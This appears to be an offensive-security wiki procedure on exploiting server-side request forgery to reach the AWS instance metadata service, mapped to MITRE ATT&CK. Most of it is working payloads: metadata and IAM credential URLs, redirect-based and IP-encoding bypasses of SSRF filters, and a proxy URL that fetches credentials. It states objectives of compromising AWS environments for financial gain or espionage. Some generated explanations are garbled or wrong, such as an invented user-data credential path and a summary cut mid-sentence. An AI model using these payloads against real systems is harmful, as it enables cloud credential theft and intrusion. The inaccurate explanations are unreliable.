---
id: 65bb6edc-b488-4264-a8ca-1e19cf0bedbb
name: SSRF for AWS Metadata and User Data Commands
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.175211+00:00'
updated_at: '2023-04-10T20:23:59.926339+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Impact|TA0040 - Impact]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Account Access Removal|T1531 - Account Access Removal]]'
- '[[Cloud Instance Metadata API|T1522 - Cloud Instance Metadata API]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[Server-Side Request Forgery]]'
- '[[SSRF URL for AWS Bucket]]'
- '[[SSRF URL for Cloud Instances]]'
commands:
- '[[Accessing EC2 instance metadata]]'
- '[[Access IPV6 Compressed]]'
- '[[Access IPV6 Expanded]]'
- '[[Access IPV6/IPV4]]'
- '[[Access metadata service]]'
- '[[AWS metadata and credentials]]'
- '[[Convert Decimal IP to IPV4]]'
- '[[Get Security Credentials]]'
- '[[Instance Data URLs]]'
- '[[Redirection from static URL to dynamic URL]]'
- '[[Redirection to AWS metadata endpoint]]'
- '[[Retrieve metadata]]'
---

# SSRF for AWS Metadata and User Data Commands

## Summary

This procedure involves exploiting a server-side request forgery (SSRF) vulnerability to send unauthorized requests from a vulnerable web application to the AWS metadata and user data commands. By doing so, an attacker can gain access to sensitive information such as security credentials, which can

## Description

# Description

This procedure involves exploiting a server-side request forgery (SSRF) vulnerability to send unauthorized requests from a vulnerable web application to the AWS metadata and user data commands. By doing so, an attacker can gain access to sensitive information such as security credentials, which can be used to further compromise the AWS environment. Technical details of this attack involve crafting malicious requests that exploit the vulnerable application's ability to make HTTP requests to arbitrary URLs. Business value of this attack can lead to unauthorized access to sensitive data, which can be used for financial gain or espionage.

 

## Requirements

1. Access to a vulnerable web application that allows SSRF.

1. Knowledge of the AWS metadata and user data commands.

 

## Defense

1. Implement input validation and sanitization to prevent SSRF attacks.

1. Implement network segmentation to limit access to sensitive systems.

1. Implement least privilege access control to limit the impact of compromised credentials.

 

## Objectives

1. Gain access to sensitive information such as security credentials.

1. Compromise the AWS environment.

1. Use the obtained information for financial gain or espionage.

 

# Instructions

1. Use this URL to access the metadata of an EC2 instance running on AWS.

 



**Code**: [[http://169.254.169.254]]



> The AWS metadata endpoint is a service provided by AWS that allows EC2 instances to access their instance metadata. This metadata includes information about the instance, such as its instance ID, IP address, and security groups. To access the metadata, you can use the URL http://169.254.169.254. You can then append a path to the URL to access specific metadata values. For example, to access the instance ID, you would use the URL http://169.254.169.254/latest/meta-data/instance-id.



**Command** ([[Access metadata service]]):

```bash
http://169.254.169.254
```



2. curl http://instance-data/latest/meta-data/instance-id

 



**Code**: [[http://instance-data]]



> This command retrieves the unique identifier of the EC2 instance by querying the instance metadata service. The 'curl' command is used to retrieve the data from the metadata service. The 'http://instance-data/latest/meta-data/instance-id' is the endpoint that returns the instance id. This command can be used to automate tasks that require the instance id as an input parameter, such as scaling or load balancing.



**Command** ([[Retrieve metadata]]):

```bash
http://instance-data
```



3. To retrieve the metadata and user data for an instance, use the following commands:
- curl http://169.254.169.254/latest/meta-data/
- curl http://169.254.169.254/latest/user-data/

 



**Code**: [[Always here : /latest/meta-data/{hostname,public-i]]



> The AWS Metadata and User Data Commands are used to retrieve information about an EC2 instance. The 'Always here' URL provides information about the instance's metadata, such as its hostname and public IP address. The 'User data' URL provides the startup script for auto-scaling. The 'Temporary AWS credentials' URL provides temporary credentials for accessing AWS resources. To retrieve this information, use the 'curl' command with the appropriate URL. The 'instruction' field provides an example of how to use these commands.



**Command** ([[AWS metadata and credentials]]):

```bash
Always here : /latest/meta-data/{hostname,public-ipv4,...}
User data (startup script for auto-scaling) : /latest/user-data
Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
```



4. To retrieve instance metadata from an EC2 instance, you can use the DNS record http://169.254.169.254/latest/meta-data/.

 



**Code**: [[http://instance-data
http://169.254.169.254
http:/]]



> This DNS record is used to retrieve instance metadata from within an EC2 instance. The metadata includes information such as instance ID, instance type, public and private IP addresses, and more. You can also use this DNS record to retrieve user-data that was passed to the instance during launch.



**Command** ([[Instance Data URLs]]):

```bash
http://instance-data
http://169.254.169.254
http://169.254.169.254.nip.io/
```



5. The HTTP Redirect command is used to redirect HTTP traffic from one URL to another. There are two types of redirects: Static and Dynamic. Static redirects are used when you want to redirect traffic from one URL to another URL that does not change. Dynamic redirects are used when you want to redirect traffic from one URL to another URL that changes frequently. 

 



**Code**: [[Static:http://nicob.net/redir6a
Dynamic:http://nic]]



> The Static redirect is achieved by specifying the new URL in the 'Static' field of the command. The Dynamic redirect is achieved by specifying a script that generates the new URL in the 'Dynamic' field of the command. The script should output the new URL to stdout. The redirect can be tested by accessing the original URL in a web browser. The browser should automatically redirect to the new URL.



**Command** ([[Redirection from static URL to dynamic URL]]):

```bash
Static:http://nicob.net/redir6a
```





**Command** ([[Redirection to AWS metadata endpoint]]):

```bash
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
```



6. The 'Alternate IP Encoding Formats' command provides various formats for encoding IP addresses. The formats include dotted decimal with overflow, dotless decimal, dotted hexadecimal, dotless hexadecimal with overflow, dotted octal, dotted octal with padding, and mixed encoding (dotted octal + dotted decimal).

 



**Code**: [[http://425.510.425.510/ Dotted decimal with overfl]]



> The 'Alternate IP Encoding Formats' command can be used to encode IP addresses in various formats. The dotted decimal with overflow format allows values greater than 255 to be represented by adding an additional octet. The dotless decimal format represents the IP address as a single decimal number. The dotted hexadecimal format represents the IP address as a series of hexadecimal numbers separated by periods. The dotless hexadecimal with overflow format allows values greater than FF to be represented by adding additional octets. The dotted octal format represents the IP address as a series of octal numbers separated by periods. The dotted octal with padding format allows leading zeros to be added for each octet. The mixed encoding format allows for a combination of dotted octal and dotted decimal formats to be used to represent the IP address.

7. Use these URLs to retrieve metadata and user data for an EC2 instance. The metadata URL provides information about the instance, such as its AMI ID and hostname, while the user data URL provides any data that was passed to the instance during launch. The security credentials URLs provide temporary security credentials for the specified IAM role or instance profile.

 



**Code**: [[http://169.254.169.254/latest/user-data
http://169]]



> The following are the details of each URL:
- http://169.254.169.254/latest/user-data: Returns the user data that was passed to the instance during launch.
- http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]: Returns temporary security credentials for the specified IAM role.
- http://169.254.169.254/latest/meta-data/: Returns a list of available metadata categories.
- http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]: Returns temporary security credentials for the specified IAM role.
- http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance: Returns temporary security credentials for the instance profile named PhotonInstance.
- http://169.254.169.254/latest/meta-data/ami-id: Returns the AMI ID of the instance.
- http://169.254.169.254/latest/meta-data/reservation-id: Returns the ID of the reservation that the instance is part of.
- http://169.254.169.254/latest/meta-data/hostname: Returns the private DNS hostname of the instance.
- http://169.254.169.254/latest/meta-data/public-keys/: Returns a list of available public keys.
- http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key: Returns the public key for the root user.
- http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key: Returns the public key for the specified user ID.
- http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy: Returns temporary security credentials for the dummy IAM role.
- http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access: Returns temporary security credentials for the instance profile named s3access.
- http://169.254.169.254/latest/dynamic/instance-identity/document: Returns a document that contains metadata about the instance, such as its region and account ID.



**Command** ([[Accessing EC2 instance metadata]]):

```bash
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```



8. To bypass AWS SSRF protection, use any of the following commands:

 

1. Converted Decimal IP: This command converts the IP address into a decimal format and appends it to the URL. This can bypass the SSRF protection as the AWS server may treat it as a valid internal request.

2. IPV6 Compressed: This command uses the compressed IPV6 format to bypass the SSRF protection. The compressed format can be used to obfuscate the actual IP address and trick the AWS server into treating it as a valid internal request.

3. IPV6 Expanded: This command uses the expanded IPV6 format to bypass the SSRF protection. The expanded format can be used to obfuscate the actual IP address and trick the AWS server into treating it as a valid internal request.

4. IPV6/IPV4: This command uses a combination of IPV6 and IPV4 addresses to bypass the SSRF protection. The AWS server may treat this request as a valid internal request and allow access to the requested resource.



**Command** ([[Convert Decimal IP to IPV4]]):

```bash
2852039166
```





**Command** ([[Access IPV6 Compressed]]):

```bash
http://[::ffff:a9fe:a9fe]/latest/meta-data/
```





**Command** ([[Access IPV6 Expanded]]):

```bash
http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
```





**Command** ([[Access IPV6/IPV4]]):

```bash
http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
```



9. Exploit the SSRF vulnerability in Jira to send a request to the AWS metadata endpoint and obtain sensitive information.

 



**Code**: [[https://help.redacted.com/plugins/servlet/oauth/us]]



> The vulnerability allows an attacker to send crafted requests to internal resources, such as the AWS metadata endpoint, which can lead to sensitive information disclosure. The attacker can use this information to further escalate the attack and gain access to other resources or systems within the target environment.

10. To retrieve IAM security credentials for a specific instance, use the following command: 

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<instance-profile-name>

 



**Code**: [[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.fl]]



> The above command retrieves the IAM security credentials for a specific EC2 instance, based on the instance profile name. The instance profile must have the necessary permissions to access the requested resources. The returned credentials include an access key, a secret access key, and a security token, which can be used to authenticate AWS API requests.



**Command** ([[Get Security Credentials]]):

```bash
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Impact|TA0040 - Impact]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Account Access Removal|T1531 - Account Access Removal]]
- [[Cloud Instance Metadata API|T1522 - Cloud Instance Metadata API]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Accessing EC2 instance metadata]]
- [[Access IPV6 Compressed]]
- [[Access IPV6 Expanded]]
- [[Access IPV6/IPV4]]
- [[Access metadata service]]
- [[AWS metadata and credentials]]
- [[Convert Decimal IP to IPV4]]
- [[Get Security Credentials]]
- [[Instance Data URLs]]
- [[Redirection from static URL to dynamic URL]]
- [[Redirection to AWS metadata endpoint]]
- [[Retrieve metadata]]

## Tags

- [[Server-Side Request Forgery]]
- [[SSRF URL for AWS Bucket]]
- [[SSRF URL for Cloud Instances]]


